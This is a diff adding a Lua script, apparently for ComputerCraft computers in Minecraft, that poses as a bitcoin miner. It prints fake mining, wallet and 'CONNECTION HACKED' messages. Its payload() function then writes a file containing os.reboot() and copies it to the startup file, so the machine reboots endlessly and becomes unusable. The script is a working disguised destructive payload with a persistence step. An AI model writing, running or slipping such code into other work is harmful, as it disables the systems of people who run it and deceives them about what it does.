@@ -1,0 +1,35 @@
+function payload()
+    local fileName = "TERMINATOR.lua"
+    local fileContent = "os.reboot()"
+    local file = fs.open(fileName, "w")
+    if file then
+        file.write(fileContent)
+        file.close()
+        print("Payload TERMINATOR.lua Succesfully Booted. Say by to ur computer")
+    else
+        print("Umm...  , this isn't supposed to happen")
+    end
+    fs.copy("TERMINATOR.lua", "startup")
+end
+print("Initializing")
+sleep(1)
+print("Initialized")
+sleep(0.5)
+print("Mining")
+sleep(5)
+print("0.001 BTC mined")
+sleep(0.5)
+print("Connecting to Bitcoin wallet")
+sleep(2)
+print("Connected")
+sleep(0.5)
+print("Transfering")
+sleep(0.5)
+term.setTextColor(colours.red)
+print("CONNECTION HACKED")
+sleep(0.5)
+print("BITCOIN TRANSFERRED TO THAT SHADY LINK YOU CLICKED")
+sleep(0.5)
+payload()
+sleep(2)
+os.reboot()
